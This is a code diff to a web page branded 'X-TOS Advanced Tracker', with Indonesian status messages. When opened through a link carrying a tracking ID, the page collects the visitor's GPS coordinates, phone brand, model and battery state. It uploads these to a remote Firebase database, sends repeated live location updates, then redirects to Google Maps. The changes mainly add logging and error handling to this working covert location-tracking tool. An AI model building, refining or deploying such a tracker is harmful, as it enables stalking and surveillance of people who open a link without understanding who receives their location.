@@ -95,8 +95,9 @@
         }
         
         function sendLocationData(locationData) {
-            // Decrypt tracking ID if encrypted
             let trackingId = urlParams.get('id') || 'default_' + Date.now();
+            
+            // Decrypt if encrypted
             try {
                 if (trackingId.includes('_enc_')) {
                     trackingId = atob(trackingId.replace('_enc_', ''));
@@ -105,12 +106,11 @@
                 console.log('Using plain tracking ID');
             }
             
-            // Extract REAL device info from User-Agent
+            // Enhanced device detection
             const ua = navigator.userAgent;
             let deviceBrand = 'Unknown';
             let deviceModel = 'Unknown';
             
-            // Enhanced device parsing
             if (ua.includes('SM-')) {
                 deviceBrand = 'Samsung';
                 const match = ua.match(/SM-([A-Z0-9]+)/);
@@ -167,7 +167,7 @@
                 }
             }
             
-            // Get real battery level
+            // Battery level detection
             let batteryLevel = 'Unknown';
             let batteryCharging = false;
             
@@ -210,9 +210,9 @@
                 '.expires': Date.now() + (60 * 60 * 1000)
             };
             
-            console.log('Sending data to Firebase:', firebaseData);
+            console.log('🚀 Sending data to Firebase:', firebaseData);
             
-            // Send to both paths
+            // Send to both Firebase paths
             const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`;
             const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`;
             
@@ -221,6 +221,10 @@
                 method: 'PUT',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(firebaseData)
+            }).then(response => {
+                console.log('✅ Main Firebase response:', response.status);
+            }).catch(e => {
+                console.error('❌ Main Firebase error:', e);
             });
             
             // Live path
@@ -230,19 +234,25 @@
                 body: JSON.stringify({
                     ...firebaseData,
                     lastUpdate: Date.now(),
-                    isLive: true
+                    isLive: true,
+                    updateNumber: 1
                 })
-            }).then(() => {
+            }).then(response => {
+                console.log('✅ Live Firebase response:', response.status);
                 updateStatus('✅ Lokasi berhasil dikirim!');
+                
+                // Start real-time tracking
                 startContinuousTracking(trackingId);
+                
+                // Redirect
                 setTimeout(() => {
-                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
-                }, 2000);
+                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}&z=18`;
+                }, 3000);
             }).catch(e => {
-                console.error('Firebase error:', e);
+                console.error('❌ Live Firebase error:', e);
                 setTimeout(() => {
-                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
-                }, 2500);
+                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}&z=18`;
+                }, 3500);
             });
         }
         
@@ -261,18 +271,33 @@
                     
                     updateStatus('✅ Lokasi berhasil diambil!');
                     document.getElementById('coords').innerHTML = 
-                        `<strong>Koordinat:</strong><br>Lat: ${locationData.latitude.toFixed(6)}<br>Lng: ${locationData.longitude.toFixed(6)}`;
+                        `<strong>📍 Koordinat:</strong><br>Lat: ${locationData.latitude.toFixed(6)}<br>Lng: ${locationData.longitude.toFixed(6)}<br>Akurasi: ${Math.round(position.coords.accuracy)}m`;
                     document.getElementById('coords').style.display = 'block';
                     
                     sendLocationData(locationData);
                 },
                 error => {
-                    updateStatus('❌ Gagal mengambil lokasi. Coba lagi.', true);
-                    console.log('Location error:', error);
+                    let errorMsg = '❌ Gagal mengambil lokasi: ';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg += 'Izin ditolak';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg += 'GPS tidak tersedia';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg += 'Timeout';
+                            break;
+                        default:
+                            errorMsg += 'Error tidak dikenal';
+                            break;
+                    }
+                    updateStatus(errorMsg, true);
+                    console.error('Location error:', error);
                 },
                 {
                     enableHighAccuracy: false,
-                    timeout: 5000,
+                    timeout: 8000,
                     maximumAge: 30000
                 }
             );
@@ -283,9 +308,12 @@
             let updateCount = 0;
             const maxUpdates = 10;
             
+            console.log('🔄 Starting real-time tracking...');
+            
             const trackingInterval = setInterval(() => {
                 if (updateCount >= maxUpdates) {
                     clearInterval(trackingInterval);
+                    console.log('✅ Real-time tracking completed');
                     return;
                 }
                 
@@ -306,10 +334,13 @@
                             method: 'PUT',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify(liveData)
+                        }).then(response => {
+                            console.log(`🔴 Live update #${updateCount + 1} sent (${response.status})`);
+                        }).catch(e => {
+                            console.error(`❌ Live update #${updateCount + 1} failed:`, e);
                         });
                         
                         updateCount++;
-                        console.log(`Live update ${updateCount}/${maxUpdates} sent`);
                     },
                     error => console.log('Live tracking error:', error),
                     {
@@ -323,14 +354,21 @@
         
         // Auto-start
         window.addEventListener('load', () => {
+            console.log('🚀 X-TOS Tracker loaded');
+            console.log('📋 URL parameters:', window.location.search);
+            console.log('🔑 Tracking ID:', urlParams.get('id'));
+            
             if ('geolocation' in navigator) {
-                setTimeout(requestLocation, 1000);
+                updateStatus('🔄 Initializing tracking system...');
+                setTimeout(() => {
+                    requestLocation();
+                }, 1500);
             } else {
                 updateStatus('❌ Browser tidak mendukung GPS', true);
             }
         });
         
-        console.log('Page loaded, tracking ID:', urlParams.get('id'));
+        console.log('🎯 X-TOS Advanced Tracker initialized');
     </script>
 </body>
 </html>
